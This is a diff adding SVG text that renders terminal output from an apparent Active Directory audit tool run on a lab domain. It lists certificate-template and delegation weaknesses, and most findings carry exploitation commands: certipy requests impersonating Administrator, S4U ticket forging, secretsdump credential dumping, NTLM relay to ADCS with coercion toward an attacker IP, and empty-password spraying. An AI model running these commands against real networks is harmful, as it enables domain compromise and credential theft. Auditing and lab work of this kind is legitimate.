+<text x="219.6" y="5016.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="5016.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="5016.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="5016.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="517.1" y="5016.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="587.6" y="5016.5" fill="#d29922" xml:space="preserve">-target</text>
+<text x="650.2" y="5016.5" fill="#39c5cf" xml:space="preserve">&#x27;DC01.corp.local&#x27;</text>
+<text x="791.2" y="5016.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="846.0" y="5016.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="939.9" y="5016.5" fill="#d29922" xml:space="preserve">-ns</text>
+<text x="971.3" y="5016.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="1065.2" y="5016.5" fill="#d29922" xml:space="preserve">-dns-tcp</text>
+<text x="1135.7" y="5016.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="1167.0" y="5016.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="1245.3" y="5016.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="1323.6" y="5016.5" fill="#39c5cf" xml:space="preserve">&#x27;ESC2-Test&#x27;</text>
+<text x="31.7" y="5034.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="5034.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC3 — 1 vulnerable template(s)</text>
+<text x="86.5" y="5051.5" fill="#6e7681" xml:space="preserve">Allows enrolling on behalf of other users → impersonate any user.</text>
+<text x="86.5" y="5069.0" fill="#6e7681" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
+<text x="86.5" y="5086.5" fill="#6e7681" xml:space="preserve">  - ESC3-Test  (enrollable by: Domain Users, Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="5104.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5104.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="5104.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="5104.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="5104.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="5104.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="5104.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="5104.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="5104.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="5104.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="5104.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="5104.0" fill="#39c5cf" xml:space="preserve">&#x27;ESC3-Test&#x27;</text>
+<text x="1057.4" y="5104.0" fill="#6e7681" xml:space="preserve"># enrollment-agent cert</text>
+<text x="133.4" y="5121.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5121.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="5121.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="5121.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="5121.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="5121.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="5121.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="5121.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="5121.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="5121.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="5121.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="5121.5" fill="#39c5cf" xml:space="preserve">User</text>
+<text x="986.9" y="5121.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="1026.1" y="5121.5" fill="#39c5cf" xml:space="preserve">&lt;agent&gt;.pfx</text>
+<text x="1120.0" y="5121.5" fill="#d29922" xml:space="preserve">-on-behalf-of</text>
+<text x="1229.7" y="5121.5" fill="#39c5cf" xml:space="preserve">&#x27;CORP\Administrator&#x27;</text>
+<text x="133.4" y="5139.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5139.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="5139.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="5139.0" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="5139.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="5139.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="5156.5" fill="#6e7681" xml:space="preserve"># If RPC is filtered — Kerberos (add: impacket-getTGT corp.local/administrateur:&#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 &amp;&amp; export KRB5CCNAME=administrateur.ccache ; then -k -no-pass -target &#x27;DC01.corp.local&#x27; -ns 10.10.10.10 -dns-tcp to each req)</text>
+<text x="31.7" y="5174.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="5174.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC9 — 1 vulnerable template(s)</text>
+<text x="86.5" y="5191.5" fill="#6e7681" xml:space="preserve">Issued certificates omit the SID security extension. Combined with a weak certificate mapping on the DC (ESC10/altSecurityIdentities), a low-priv user can enroll and impersonate another account.</text>
+<text x="86.5" y="5209.0" fill="#6e7681" xml:space="preserve">Pair with: certipy req … then account-mapping abuse.</text>
+<text x="86.5" y="5226.5" fill="#6e7681" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
+<text x="86.5" y="5244.0" fill="#6e7681" xml:space="preserve">  - ESC9-Test  (enrollable by: Domain Users, Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="5261.5" fill="#6e7681" xml:space="preserve"># Direct (RPC/DCOM — needs TCP 135 + dynamic RPC ports open to the CA):</text>
+<text x="133.4" y="5279.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5279.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="5279.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="5279.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="5279.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="5279.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="5279.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="5279.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="5279.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="5279.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="5279.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="5279.0" fill="#39c5cf" xml:space="preserve">&#x27;ESC9-Test&#x27;</text>
+<text x="1041.7" y="5279.0" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1080.9" y="5279.0" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="5296.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5296.5" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="5296.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="5296.5" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="5296.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="5296.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="5314.0" fill="#6e7681" xml:space="preserve"># If RPC is filtered (&#x27;No route to host&#x27; / endpoint mapper) — use Kerberos:</text>
+<text x="133.4" y="5331.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="258.7" y="5331.5" fill="#39c5cf" xml:space="preserve">corp.local/administrateur:&#x27;P@ssw0rd!&#x27;</text>
+<text x="556.3" y="5331.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="611.1" y="5331.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="5349.0" fill="#3fb950" font-weight="bold" xml:space="preserve">export</text>
+<text x="188.3" y="5349.0" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="133.4" y="5366.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5366.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="5366.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="5366.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="5366.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="517.1" y="5366.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="587.6" y="5366.5" fill="#d29922" xml:space="preserve">-target</text>
+<text x="650.2" y="5366.5" fill="#39c5cf" xml:space="preserve">&#x27;DC01.corp.local&#x27;</text>
+<text x="791.2" y="5366.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="846.0" y="5366.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="939.9" y="5366.5" fill="#d29922" xml:space="preserve">-ns</text>
+<text x="971.3" y="5366.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="1065.2" y="5366.5" fill="#d29922" xml:space="preserve">-dns-tcp</text>
+<text x="1135.7" y="5366.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="1167.0" y="5366.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="1245.3" y="5366.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="1323.6" y="5366.5" fill="#39c5cf" xml:space="preserve">&#x27;ESC9-Test&#x27;</text>
+<text x="1417.6" y="5366.5" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1456.7" y="5366.5" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="5384.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5384.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="5384.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="5384.0" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="5384.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="5384.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="31.7" y="5401.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="5401.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC13 — 1 vulnerable template(s)</text>
+<text x="86.5" y="5419.0" fill="#6e7681" xml:space="preserve">Certificates from this template confer membership of the linked AD group via the PKINIT PAC — privilege escalation without joining it.</text>
+<text x="86.5" y="5436.5" fill="#6e7681" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
+<text x="86.5" y="5454.0" fill="#6e7681" xml:space="preserve">  - ESC13-Test  (enrollable by: Domain Users, Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="5471.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5471.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="5471.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="5471.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="5471.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="5471.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="5471.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="5471.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="5471.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="5471.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="5471.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="5471.5" fill="#39c5cf" xml:space="preserve">&#x27;ESC13-Test&#x27;</text>
+<text x="1065.2" y="5471.5" fill="#6e7681" xml:space="preserve"># issued cert carries the OID-linked group</text>
+<text x="133.4" y="5489.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="5489.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="5489.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="5489.0" fill="#39c5cf" xml:space="preserve">administrateur.pfx</text>
+<text x="446.6" y="5489.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="501.5" y="5489.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="611.1" y="5489.0" fill="#6e7681" xml:space="preserve"># PKINIT PAC now grants: ESC13-Admins</text>
+<text x="133.4" y="5506.5" fill="#6e7681" xml:space="preserve"># No SAN needed — the issuance policy confers membership of ESC13-Admins on any enrollee.</text>
+<text x="31.7" y="5524.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="5524.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC4 — Dangerous ACL on 1 template(s)</text>
+<text x="86.5" y="5541.5" fill="#6e7681" xml:space="preserve">A low-priv user can modify the template to introduce ESC1/ESC2.</text>
+<text x="86.5" y="5559.0" fill="#6e7681" xml:space="preserve">ESC4-Test</text>
+<text x="31.7" y="5576.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="5576.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">PASSWD_NOTREQD — 3 account(s)</text>
+<text x="86.5" y="5594.0" fill="#6e7681" xml:space="preserve">These accounts may have an empty password.</text>
+<text x="86.5" y="5611.5" fill="#6e7681" xml:space="preserve"># Test for empty passwords on: Invité,nopwd,PARTNER$</text>
+<text x="86.5" y="5629.0" fill="#3fb950" font-weight="bold" xml:space="preserve">nxc</text>
+<text x="117.8" y="5629.0" fill="#39c5cf" xml:space="preserve">smb</text>
+<text x="149.1" y="5629.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="243.1" y="5629.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="266.6" y="5629.0" fill="#39c5cf" xml:space="preserve">Invité</text>
+<text x="321.4" y="5629.0" fill="#39c5cf" xml:space="preserve">nopwd</text>
+<text x="368.4" y="5629.0" fill="#39c5cf" xml:space="preserve">PARTNER$</text>
+<text x="438.8" y="5629.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="462.3" y="5629.0" fill="#39c5cf" xml:space="preserve">&#x27;&#x27;</text>
+<text x="31.7" y="5646.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="5646.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">AdminSDHolder orphans — 1 stale privileged account(s)</text>
+<text x="86.5" y="5664.0" fill="#6e7681" xml:space="preserve">These carry adminCount=1 but are no longer a (transitive) member of any protected group. They were privileged once → expect residual access, a stale locked-down ACL (inheritance still disabled), or an adminCount persistence marker. Review each:</text>
+<text x="86.5" y="5681.5" fill="#6e7681" xml:space="preserve">  stale-admin</text>
+<text x="31.7" y="5699.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="5699.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">RC4 Kerberos surface on 3 roastable account(s)</text>
+<text x="86.5" y="5716.5" fill="#6e7681" xml:space="preserve">Roastable accounts that still accept RC4: request an RC4 ticket to get an etype-23 hash (hashcat -m 13100 / -m 18200, fast) instead of slow AES — a downgrade even when AES is also supported:</text>
+<text x="86.5" y="5734.0" fill="#6e7681" xml:space="preserve">  svc-rc4, svc-sql, noauth</text>
+<text x="31.7" y="5751.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="5751.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Cert Publishers&#x27; has 1 member(s)</text>
+<text x="86.5" y="5769.0" fill="#6e7681" xml:space="preserve">Members (1):</text>
+<text x="86.5" y="5786.5" fill="#6e7681" xml:space="preserve">  • DC01</text>
+<text x="86.5" y="5821.5" fill="#6e7681" xml:space="preserve">Escalation: Members&#x27; hosts are trusted to publish certificates; relevant to ADCS / NTAuth review (cross-check the adcs module).</text>
+<text x="31.7" y="5839.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="5839.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Remote Management Users&#x27; has 1 member(s)</text>
+<text x="86.5" y="5856.5" fill="#6e7681" xml:space="preserve">Members (1):</text>
+<text x="86.5" y="5874.0" fill="#6e7681" xml:space="preserve">  • lowpriv</text>
+<text x="86.5" y="5909.0" fill="#6e7681" xml:space="preserve">Escalation: WinRM access to member hosts → lateral movement with a member&#x27;s creds.</text>
+<text x="31.7" y="5926.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="5926.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Constrained Delegation — 1 computer(s)</text>
+<text x="86.5" y="5944.0" fill="#6e7681" xml:space="preserve">May be exploitable via S4U2Proxy / protocol transition.</text>
+<text x="86.5" y="5961.5" fill="#6e7681" xml:space="preserve">Targets: APP01</text>
+<text x="31.7" y="5979.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="5979.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Weak minimum password length (7)</text>
+<text x="86.5" y="5996.5" fill="#6e7681" xml:space="preserve">Short passwords are easier to crack after a hash dump.</text>
+<text x="31.7" y="6014.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="6014.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Password complexity disabled</text>
+<text x="86.5" y="6031.5" fill="#6e7681" xml:space="preserve">Users may set simple dictionary passwords.</text>
+<text x="31.7" y="6049.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="6049.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ADIDNS — wildcard (*) record present in 1 zone(s)</text>
+<text x="86.5" y="6066.5" fill="#6e7681" xml:space="preserve">A &#x27;*&#x27; record answers every otherwise-unresolved name in the zone. Two consequences:</text>
+<text x="86.5" y="6084.0" fill="#6e7681" xml:space="preserve">  - it already catches missing-name / wpad queries, so classic ADIDNS name-injection is largely neutralised in that zone;</text>
+<text x="86.5" y="6101.5" fill="#6e7681" xml:space="preserve">  - whoever can overwrite the &#x27;*&#x27; controls resolution of ALL unresolved names (domain-wide MITM) — cross-check the &#x27;writable records&#x27; finding, and confirm the current target is expected:</text>
+<text x="86.5" y="6119.0" fill="#6e7681" xml:space="preserve">  - corp.local: A 10.10.10.99</text>
+<text x="31.7" y="6136.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="6136.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Constrained Delegation — 1 account(s)</text>
+<text x="86.5" y="6154.0" fill="#6e7681" xml:space="preserve">May be exploitable via S4U2Proxy if you can compromise the delegating account.</text>
+<text x="86.5" y="6171.5" fill="#6e7681" xml:space="preserve">Accounts: APP01$</text>
+<text x="86.5" y="6189.0" fill="#6e7681" xml:space="preserve"># Compromise &#x27;APP01$&#x27; first, then S4U (S4U2Proxy (requires the account&#x27;s TGT/secret)):</text>
+<text x="86.5" y="6206.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getST</text>
+<text x="203.9" y="6206.5" fill="#d29922" xml:space="preserve">-spn</text>
+<text x="243.1" y="6206.5" fill="#39c5cf" xml:space="preserve">&#x27;cifs/&lt;target.fqdn&gt;&#x27;</text>
+<text x="407.5" y="6206.5" fill="#d29922" xml:space="preserve">-impersonate</text>
+<text x="509.3" y="6206.5" fill="#39c5cf" xml:space="preserve">Administrator</text>
+<text x="618.9" y="6206.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="673.7" y="6206.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="767.7" y="6206.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/APP01$:&lt;password&gt;&#x27;</text>
+<text x="1026.1" y="6206.5" fill="#6e7681" xml:space="preserve"># or -hashes LM:NT</text>
+<text x="86.5" y="6224.0" fill="#3fb950" font-weight="bold" xml:space="preserve">export</text>
+<text x="141.3" y="6224.0" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=Administrator@*.ccache</text>
+<text x="415.3" y="6224.0" fill="#6e7681" xml:space="preserve"># the resulting ticket</text>
+<text x="86.5" y="6241.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="250.9" y="6241.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="274.4" y="6241.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="344.9" y="6241.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="399.7" y="6241.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="493.6" y="6241.5" fill="#39c5cf" xml:space="preserve">&#x27;&lt;target.fqdn&gt;&#x27;</text>
+<text x="31.7" y="6259.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="6259.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">RBCD configured on 1 account(s)</text>
+<text x="86.5" y="6276.5" fill="#6e7681" xml:space="preserve">An actor with write access to msDS-AllowedToActOnBehalfOfOtherIdentity can</text>
+<text x="86.5" y="6294.0" fill="#6e7681" xml:space="preserve">set up RBCD to impersonate any user to the target service.</text>
+<text x="86.5" y="6311.5" fill="#6e7681" xml:space="preserve">Accounts: SQL01$</text>
+<text x="86.5" y="6329.0" fill="#6e7681" xml:space="preserve"># &#x27;SQL01$&#x27; trusts another account for delegation — if you control it:</text>
+<text x="86.5" y="6346.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getST</text>
+<text x="203.9" y="6346.5" fill="#d29922" xml:space="preserve">-spn</text>
+<text x="243.1" y="6346.5" fill="#39c5cf" xml:space="preserve">&#x27;cifs/SQL01.corp.local&#x27;</text>
+<text x="431.0" y="6346.5" fill="#d29922" xml:space="preserve">-impersonate</text>
+<text x="532.8" y="6346.5" fill="#39c5cf" xml:space="preserve">Administrator</text>
+<text x="642.4" y="6346.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="697.2" y="6346.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="791.2" y="6346.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/&lt;CONTROLLED$&gt;:&lt;password&gt;&#x27;</text>
+<text x="86.5" y="6364.0" fill="#3fb950" font-weight="bold" xml:space="preserve">export</text>
+<text x="141.3" y="6364.0" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=Administrator@*.ccache</text>
+<text x="86.5" y="6381.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="250.9" y="6381.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="274.4" y="6381.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="344.9" y="6381.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="399.7" y="6381.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="493.6" y="6381.5" fill="#39c5cf" xml:space="preserve">&#x27;SQL01.corp.local&#x27;</text>
+<text x="31.7" y="6399.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">[MEDIUM]</text>
+<text x="102.1" y="6399.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC8 on CA corp-CA — web enrollment (http)</text>
+<text x="86.5" y="6416.5" fill="#6e7681" xml:space="preserve">http enrollment reachable; NTLM not confirmed.</text>
+<text x="86.5" y="6434.0" fill="#6e7681" xml:space="preserve">Coerce a DC/machine to authenticate, then relay to ADCS:</text>
+<text x="102.1" y="6451.5" fill="#6e7681" xml:space="preserve"># relay (impacket). NOTE: may crash at &#x27;Generating CSR...&#x27; on recent pyOpenSSL</text>
+<text x="102.1" y="6469.0" fill="#6e7681" xml:space="preserve">#   (&gt;=24 removed crypto.X509Req) — use the certipy variant below if so:</text>
+<text x="102.1" y="6486.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-ntlmrelayx</text>
+<text x="258.7" y="6486.5" fill="#d29922" xml:space="preserve">-t</text>
+<text x="282.2" y="6486.5" fill="#39c5cf" xml:space="preserve">http://10.10.10.10/certsrv/certfnsh.asp</text>
+<text x="595.4" y="6486.5" fill="#d29922" xml:space="preserve">-smb2support</text>
+<text x="697.2" y="6486.5" fill="#d29922" xml:space="preserve">--adcs</text>
+<text x="752.0" y="6486.5" fill="#d29922" xml:space="preserve">--template</text>
+<text x="838.1" y="6486.5" fill="#39c5cf" xml:space="preserve">DomainController</text>
+<text x="102.1" y="6504.0" fill="#6e7681" xml:space="preserve"># relay (certipy) — modern crypto, resilient to the pyOpenSSL breakage:</text>
+<text x="102.1" y="6521.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="188.3" y="6521.5" fill="#39c5cf" xml:space="preserve">relay</text>
+<text x="235.2" y="6521.5" fill="#d29922" xml:space="preserve">-target</text>
+<text x="297.9" y="6521.5" fill="#39c5cf" xml:space="preserve">&#x27;http://10.10.10.10&#x27;</text>
+<text x="462.3" y="6521.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="540.6" y="6521.5" fill="#39c5cf" xml:space="preserve">DomainController</text>
+<text x="673.7" y="6521.5" fill="#d29922" xml:space="preserve">-forever</text>
+<text x="102.1" y="6539.0" fill="#6e7681" xml:space="preserve"># coercer -t = the host you coerce (the DC), NOT the CA name; use the DC IP to avoid DNS issues:</text>
+<text x="102.1" y="6556.5" fill="#3fb950" font-weight="bold" xml:space="preserve">coercer</text>
+<text x="164.8" y="6556.5" fill="#39c5cf" xml:space="preserve">coerce</text>
+<text x="219.6" y="6556.5" fill="#d29922" xml:space="preserve">-l</text>
+<text x="243.1" y="6556.5" fill="#39c5cf" xml:space="preserve">&lt;attacker-ip&gt;</text>
+<text x="352.7" y="6556.5" fill="#d29922" xml:space="preserve">-t</text>
+<text x="376.2" y="6556.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="470.1" y="6556.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="493.6" y="6556.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur&#x27;</text>
+<text x="626.7" y="6556.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="650.2" y="6556.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="744.2" y="6556.5" fill="#d29922" xml:space="preserve">-d</text>
+<text x="767.7" y="6556.5" fill="#39c5cf" xml:space="preserve">corp.local</text>
+<text x="853.8" y="6556.5" fill="#d29922" xml:space="preserve">--always-continue</text>
+<text x="102.1" y="6574.0" fill="#6e7681" xml:space="preserve"># then: certipy-ad auth -pfx dc.pfx -dc-ip 10.10.10.10</text>
+<text x="31.7" y="6591.5" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
+<text x="86.5" y="6591.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Administrators — 4 member(s)</text>
+<text x="86.5" y="6609.0" fill="#6e7681" xml:space="preserve">Local administrators of the domain controllers → domain compromise.</text>
+<text x="86.5" y="6626.5" fill="#6e7681" xml:space="preserve">  • ESC13-Admins  (nested group)</text>
+<text x="86.5" y="6644.0" fill="#6e7681" xml:space="preserve">  • Admins du domaine  (nested group)</text>
+<text x="86.5" y="6661.5" fill="#6e7681" xml:space="preserve">  • Administrateurs de l’entreprise  (nested group)</text>
+<text x="86.5" y="6679.0" fill="#6e7681" xml:space="preserve">  • Administrateur</text>
+<text x="31.7" y="6696.5" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
+<text x="86.5" y="6696.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Domain Admins — 1 member(s)</text>
+<text x="86.5" y="6714.0" fill="#6e7681" xml:space="preserve">Full control of the domain.</text>
